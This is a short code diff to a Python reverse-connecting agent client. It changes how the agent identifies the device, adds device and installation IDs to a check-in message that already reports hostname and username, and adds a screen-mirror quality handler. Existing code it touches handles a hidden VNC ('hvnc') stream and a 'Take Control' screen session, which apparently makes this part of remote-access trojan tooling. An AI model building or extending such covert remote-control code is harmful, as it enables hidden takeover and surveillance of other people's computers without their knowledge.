@@ -276,8 +276,11 @@ class AgentClient:
     """Outbound reverse-connecting agent."""
 
     def __init__(self, config: Dict[str, Any]):
-        self.config = config
-        self.agent_id = config.get("agent_id", "agent_default")
+        from device_identity import get_device_id
+        self.config = dict(config)
+        self.installation_id = config.get("installation_id") or config.get("agent_id", "agent_default")
+        self.agent_id = get_device_id()
+        self.config["agent_id"] = self.agent_id
         from server_address import normalize_server_url
         self.server_url = normalize_server_url(config.get("server_url", "ws://127.0.0.1:8000"))
         self.reconnect_interval = config.get("reconnect_interval_sec", 5)
@@ -402,6 +405,8 @@ class AgentClient:
 
         return {
             "agent_id": self.agent_id,
+            "device_id": self.agent_id,
+            "installation_id": self.installation_id,
             "endpoint_tag": self.config.get("endpoint_tag", f"Agent-{self.agent_id}"),
             "hostname": hostname,
             "username": getpass.getuser(),
@@ -477,6 +482,9 @@ class AgentClient:
                                     if self.hvnc_stream_task and not self.hvnc_stream_task.done():
                                         self.hvnc_stream_task.cancel()
 
+                                elif mtype == "mirror_quality":
+                                    if getattr(self, "mirror_protocol", 0) == 2:
+                                        self.mirror_flow.set_quality_mode(msg.get("quality"))
                                 elif mtype == "start_mirror":
                                     logger.info("Received request to start Screen Mirror (Take Control) session.")
                                     from agent_client.mirror_transport import MirrorUplink
